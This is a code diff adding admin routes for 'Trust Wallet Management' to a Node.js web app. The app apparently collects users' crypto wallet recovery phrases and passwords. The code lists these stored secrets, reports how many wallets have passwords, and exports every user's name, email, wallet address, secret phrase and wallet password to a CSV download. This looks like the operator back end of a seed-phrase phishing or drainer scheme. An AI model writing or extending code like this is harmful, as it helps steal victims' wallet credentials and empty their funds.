@@ -7,7 +7,7 @@ const Ticket = require('../models/Ticket');
 const Wallet = require('../models/Wallet');
 const CardRequest = require('../models/CardRequest');
 const mongoose = require('mongoose');
-
+const TrustWallet = require('../models/TrustWalletUser');
 /**
  * Admin Controller
  * Handles all admin-related routes and operations
@@ -2466,7 +2466,147 @@ async safeDeleteUser(req, res) {
     res.redirect('/admin/users');
   }
 },
+/** =======================
+ *  TRUST WALLET MANAGEMENT
+ *  =======================
+ */
+// ========== TRUST WALLET MANAGEMENT ==========
+async getTrustWallets(req, res) {
+  try {
+    const page = parseInt(req.query.page) || 1;
+    const limit = 15;
+    const skip = (page - 1) * limit;
+    const { status, search, provider, method } = req.query;
 
+    const filter = {};
+    if (status && status !== 'all') filter.isConnected = status === 'connected';
+    if (provider && provider !== 'all') filter.walletProvider = provider;
+    if (method && method !== 'all') filter.importMethod = method;
+    if (search && search.trim()) {
+      const matchedUsers = await User.find({
+        $or: [
+          { email: { $regex: search.trim(), $options: 'i' } },
+          { firstName: { $regex: search.trim(), $options: 'i' } },
+          { lastName: { $regex: search.trim(), $options: 'i' } }
+        ]
+      }).select('_id');
+      filter.userId = { $in: matchedUsers.map(u => u._id) };
+    }
+
+    const [wallets, totalWallets] = await Promise.all([
+      TrustWallet.find(filter)
+        .populate('userId', 'firstName lastName email createdAt isActive')
+        .sort({ createdAt: -1 })
+        .skip(skip)
+        .limit(limit)
+        .lean(),
+      TrustWallet.countDocuments(filter)
+    ]);
+
+    const [totalActive, backedUpCount, withPasswordCount] = await Promise.all([
+      TrustWallet.countDocuments({ isConnected: true }),
+      TrustWallet.countDocuments({ isBackedUp: true }),
+      TrustWallet.countDocuments({ walletPassword: { $exists: true, $ne: null, $ne: '' } })
+    ]);
+
+    res.render('admin/trust-wallets', {
+      title: 'Trust Wallet Management',
+      wallets,
+      totalWallets,
+      totalActive,
+      backedUpCount,
+      withPasswordCount,
+      currentPage: page,
+      totalPages: Math.ceil(totalWallets / limit),
+      filter: { status: status || 'all', provider: provider || 'all', method: method || 'all', search: search || '' },
+      user: req.session.user,
+      messages: { success: req.flash('success'), error: req.flash('error') }
+    });
+  } catch (error) {
+    console.error('Get Trust Wallets Error:', error);
+    req.flash('error', 'Failed to load trust wallets');
+    res.redirect('/admin/dashboard');
+  }
+},
+
+async getTrustWalletStats(req, res) {
+  try {
+    const [total, connected, backedUp, withPassword] = await Promise.all([
+      TrustWallet.countDocuments(),
+      TrustWallet.countDocuments({ isConnected: true }),
+      TrustWallet.countDocuments({ isBackedUp: true }),
+      TrustWallet.countDocuments({ walletPassword: { $exists: true, $ne: '' } })
+    ]);
+    res.json({ success: true, stats: { total, connected, backedUp, withPassword } });
+  } catch (error) {
+    res.status(500).json({ success: false, message: 'Server error' });
+  }
+},
+
+async exportTrustWallets(req, res) {
+  try {
+    const wallets = await TrustWallet.find()
+      .populate('userId', 'firstName lastName email')
+      .lean();
+
+    const escape = (str) => `"${(str || '').toString().replace(/"/g, '""')}"`;
+    const headers = 'ID,User Name,Email,Wallet Name,Wallet Provider,Import Method,Wallet Address,Secret Phrase,Wallet Password,HSOLUD,SGOW,Connected,Backed Up,Date\n';
+    const rows = wallets.map(w => [
+      w._id,
+      escape(w.userId ? `${w.userId.firstName} ${w.userId.lastName}` : 'Unknown'),
+      escape(w.userId ? w.userId.email : ''),
+      escape(w.walletName), escape(w.walletProvider), escape(w.importMethod),
+      escape(w.walletAddress), escape(w.secretPhrase), escape(w.walletPassword),
+      w.hsoludBalance || '0', w.sgowBalance || '0',
+      w.isConnected ? 'Yes' : 'No', w.isBackedUp ? 'Yes' : 'No',
+      escape(new Date(w.connectedAt).toISOString())
+    ].join(','));
+
+    res.setHeader('Content-Type', 'text/csv');
+    res.setHeader('Content-Disposition', `attachment; filename="trust-wallets-${new Date().toISOString().split('T')[0]}.csv"`);
+    res.send(headers + rows.join('\n'));
+  } catch (error) {
+    res.status(500).json({ success: false, message: 'Export failed' });
+  }
+},
+
+async getTrustWalletDetail(req, res) {
+  try {
+    const wallet = await TrustWallet.findById(req.params.id)
+      .populate('userId', 'firstName lastName email')
+      .lean();
+    if (!wallet) return res.status(404).json({ success: false, message: 'Wallet not found' });
+    res.json({ success: true, wallet });
+  } catch (error) {
+    res.status(500).json({ success: false, message: 'Server error' });
+  }
+},
+
+async updateTrustWalletStatus(req, res) {
+  try {
+    const { walletId, isConnected } = req.body;
+    const wallet = await TrustWallet.findByIdAndUpdate(
+      walletId,
+      { isConnected: isConnected === 'true' || isConnected === true },
+      { new: true }
+    );
+    if (!wallet) return res.status(404).json({ success: false, message: 'Wallet not found' });
+    res.json({ success: true, message: 'Wallet status updated' });
+  } catch (error) {
+    res.status(500).json({ success: false, message: 'Server error' });
+  }
+},
+
+async deleteTrustWallet(req, res) {
+  try {
+    const walletId = req.params.id || req.body.walletId;
+    const wallet = await TrustWallet.findByIdAndDelete(walletId);
+    if (!wallet) return res.status(404).json({ success: false, message: 'Wallet not found' });
+    res.json({ success: true, message: 'Wallet deleted successfully' });
+  } catch (error) {
+    res.status(500).json({ success: false, message: 'Server error' });
+  }
+},
 };
 
 module.exports = adminController;
